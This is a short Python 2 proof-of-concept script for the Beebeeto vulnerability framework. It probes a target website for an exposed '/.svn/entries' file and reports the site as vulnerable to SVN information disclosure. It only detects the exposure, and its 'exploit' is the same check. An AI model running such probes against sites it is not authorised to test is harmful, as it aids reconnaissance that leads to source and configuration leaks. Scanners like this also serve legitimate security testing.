#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0024',
            'name': 'SVN information disclosure POC',
            'author': 'Eth0n',
            'create_date': '2014-09-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'All site svn configuration wrong',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['information disclosure', 'svn'],
            'desc': 'use svn incorrect cause site information disclosure',
            'references': ['http://drops.wooyun.org/tips/352',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        keyword = ['file','dir']
        vul_url = args["options"]["target"] + '/.svn/entries'
        if args['options']['verbose']:
            print "[*] Request URL:", vul_url
        resquest = urllib2.Request(vul_url)
        response = urllib2.urlopen(resquest)
        if response.getcode() != 200:
            args["success"] = False
            return args
        content = response.read()
        flag = False
        for word in keyword:
            if word in content:
                flag = True
                break
        if flag == True:
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            return args
        else:
            args["success"] = False
            return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())

  
